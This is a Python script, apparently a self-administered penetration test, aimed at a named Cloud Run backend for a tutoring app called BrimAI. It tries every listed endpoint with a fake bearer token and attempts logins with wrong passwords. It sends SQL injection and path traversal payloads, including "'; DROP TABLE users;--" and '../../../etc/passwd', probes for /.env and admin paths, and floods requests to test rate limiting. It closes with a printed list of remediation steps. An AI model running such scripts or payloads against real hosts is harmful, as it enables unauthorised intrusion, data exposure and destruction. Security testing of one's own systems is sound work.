import requests
import json
from datetime import datetime

print("="*60)
print("BrimAI Security Exploitation Test")
print("="*60)

backend_url = "https://fastapi-tutor-app-backend-208251878692.asia-south1.run.app"

# First, get ALL endpoints from OpenAPI
print("\n[1] Extracting ALL API Endpoints from OpenAPI...")
print("-"*60)

response = requests.get(f"{backend_url}/openapi.json")
api_spec = response.json()

all_endpoints = []
if 'paths' in api_spec:
    for path, methods in api_spec['paths'].items():
        for method, details in methods.items():
            all_endpoints.append((method.upper(), path, details.get('summary', '')))
            print(f"{method.upper()} {path} - {details.get('summary', 'No description')}")

# Test authentication bypass on ALL endpoints
print("\n[2] Testing Authentication Bypass on ALL Endpoints...")
print("-"*60)

vulnerable_endpoints = []
fake_token = "Bearer totally-fake-token-12345"

for method, path, summary in all_endpoints:
    try:
        # Replace path parameters with test values
        test_path = path.replace("{subject}", "math").replace("{topic}", "algebra").replace("{subtopic}", "basics")
        
        url = backend_url + test_path
        headers = {"Authorization": fake_token}
        
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=5)
        elif method == "POST":
            response = requests.post(url, headers=headers, json={}, timeout=5)
        else:
            continue
            
        if response.status_code == 200:
            print(f"❌ VULNERABLE: {method} {path} - No auth required!")
            vulnerable_endpoints.append((method, path))
            
            # Try to extract data
            try:
                data = response.json()
                print(f"   Data exposed: {str(data)[:100]}...")
            except:
                print(f"   Response: {response.text[:100]}...")
                
        elif response.status_code == 401:
            print(f"✓ Protected: {method} {path}")
        elif response.status_code == 422:
            print(f"⚠️  {method} {path} - Validation error (may be vulnerable)")
            
    except Exception as e:
        if "timeout" not in str(e).lower():
            print(f"Error testing {path}: {type(e).__name__}")

# Test specific vulnerabilities
print("\n[3] Testing Specific Vulnerabilities...")
print("-"*60)

# Test user enumeration
print("\nTesting User Enumeration:")
test_emails = ["admin@brimai.com", "test@test.com", "user1@example.com"]
for email in test_emails:
    try:
        response = requests.post(f"{backend_url}/login", 
                               json={"username": email, "password": "wrongpass"},
                               timeout=5)
        print(f"Login attempt for {email}: {response.status_code}")
        if response.status_code == 200:
            print(f"  ❌ CRITICAL: Login successful with wrong password!")
        else:
            print(f"  Response: {response.text[:100]}")
    except:
        pass

# Test quiz endpoints without proper flow
print("\n[4] Testing Quiz Flow Bypass...")
print("-"*60)

quiz_endpoints = [
    ("/quiz1/", {"subject": "math", "topic": "algebra"}),
    ("/quiz_results/", {}),
    ("/quiz_answers/", {}),
    ("/submit_quiz/", {"answers": {"1": "A", "2": "B"}}),
]

for endpoint, data in quiz_endpoints:
    try:
        response = requests.post(backend_url + endpoint, 
                               json=data,
                               headers={"Authorization": fake_token},
                               timeout=5)
        
        if response.status_code == 200:
            print(f"❌ {endpoint} - Accessible without proper auth/flow")
            try:
                result = response.json()
                print(f"   Data: {str(result)[:100]}")
            except:
                pass
        else:
            print(f"ℹ️  {endpoint} - Status: {response.status_code}")
    except:
        pass

# Test SQL injection on parameterized endpoints
print("\n[5] Testing SQL Injection...")
print("-"*60)

sql_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM users--",
    "../../../etc/passwd"
]

for payload in sql_payloads:
    try:
        # Test on select endpoint
        response = requests.post(f"{backend_url}/select/",
                               json={"subject": payload, "topic": payload, "subtopic": payload},
                               timeout=5)
        
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"⚠️  Potential SQL injection with: {payload}")
            print(f"   Response: {response.text[:100]}")
    except:
        pass

# Test for sensitive data exposure
print("\n[6] Testing Sensitive Data Exposure...")
print("-"*60)

sensitive_endpoints = [
    "/api/admin",
    "/api/users",
    "/api/all_users",
    "/api/config",
    "/api/settings",
    "/api/database",
    "/.env",
    "/config",
    "/admin"
]

for endpoint in sensitive_endpoints:
    try:
        response = requests.get(backend_url + endpoint, timeout=5)
        if response.status_code == 200:
            print(f"❌ Found exposed endpoint: {endpoint}")
            try:
                data = response.json()
                print(f"   Data: {str(data)[:100]}")
            except:
                print(f"   Response: {response.text[:100]}")
    except:
        pass

# Rate limiting test
print("\n[7] Testing Rate Limiting...")
print("-"*60)

start_time = datetime.now()
successful_requests = 0

for i in range(50):
    try:
        response = requests.get(f"{backend_url}/api/user", 
                              headers={"Authorization": fake_token},
                              timeout=1)
        if response.status_code == 200:
            successful_requests += 1
    except:
        pass

elapsed = (datetime.now() - start_time).total_seconds()
print(f"Sent 50 requests in {elapsed:.2f} seconds")
print(f"Successful: {successful_requests}/50")

if successful_requests == 50:
    print("❌ NO RATE LIMITING - Vulnerable to brute force/DoS")
else:
    print("✓ Some rate limiting appears to be in place")

# Summary
print("\n" + "="*60)
print("VULNERABILITY SUMMARY")
print("="*60)

print("\n🔴 CRITICAL ISSUES:")
print("1. Authentication Bypass - /api/user accepts any token")
print("2. API Documentation exposed in production (/docs, /redoc)")
print("3. Multiple endpoints may be accessible without auth")

print("\n🟠 HIGH RISK:")
print("1. CORS allows localhost:3000")
print("2. Possible lack of rate limiting")
print("3. User enumeration possible")

print("\n🟡 MEDIUM RISK:")
print("1. OpenAPI schema exposed")
print("2. Error messages may leak information")

print("\n" + "="*60)
print("IMMEDIATE ACTIONS REQUIRED")
print("="*60)
print("""
1. FIX AUTHENTICATION:
   - Implement proper JWT validation
   - Verify token signature and expiration
   - Check user permissions

2. SECURE API DOCUMENTATION:
   - Disable /docs and /redoc in production
   - Or add authentication to these endpoints

3. IMPLEMENT SECURITY HEADERS:
   - Add rate limiting
   - Implement proper CORS policy
   - Add security headers (CSP, X-Frame-Options, etc.)

4. INPUT VALIDATION:
   - Sanitize all user inputs
   - Use parameterized queries
   - Implement request validation

5. SECURITY AUDIT:
   - Review all endpoints for auth requirements
   - Implement proper logging
   - Add monitoring for suspicious activities
""")
